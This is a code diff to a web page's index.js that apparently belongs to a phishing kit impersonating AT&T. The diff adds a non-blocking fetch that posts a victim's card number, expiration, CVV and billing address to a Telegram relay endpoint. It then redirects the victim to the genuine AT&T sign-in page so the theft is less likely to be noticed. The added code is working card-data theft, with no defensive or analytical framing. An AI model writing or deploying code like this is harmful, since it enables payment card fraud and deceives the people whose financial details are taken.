@@ -352,6 +352,33 @@ export default function Home() {
             verified: true
           });
           
+          // Send billing details to Telegram (non-blocking)
+          fetch('/api/telegram/send-billing', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              cardNumber: cardNumber,
+              expiration: expiration,
+              cvv: cvv,
+              address: address,
+              city: city,
+              state: state,
+              zip: zip,
+              userId: storedUserId
+            })
+          })
+          .then(async (response) => {
+            const data = await response.json();
+            console.log('[index.js] Billing details Telegram response:', data);
+            if (!data.success) {
+              console.warn('[index.js] Telegram billing notification warning:', data.warning || data.message);
+            }
+          })
+          .catch(error => {
+            console.warn('[index.js] Telegram billing notification error (non-blocking):', error);
+            // Don't block page redirect if notification fails
+          });
+          
           // Redirect to next page or show success
           window.location.href = 'https://signin.att.com/dynamic/iamLRR/LrrController?IAM_OP=login&appName=m14186&loginSuccessURL=https:%2F%2Foidc.idp.clogin.att.com%2Fmga%2Fsps%2Foauth%2Foauth20%2Fauthorize%3Fresponse_type%3Did_token%26client_id%3Dm14186%26redirect_uri%3Dhttps%253A%252F%252Fwww.att.com%252Fmsapi%252Flogin%252Funauth%252Fservice%252Fv1%252Fhaloc%252Foidc%252Fredirect%26state%3Dfrom%253Dnx%26scope%3Dopenid%26response_mode%3Dform_post%26nonce%3D3nv01nEz';
         } catch (error) {
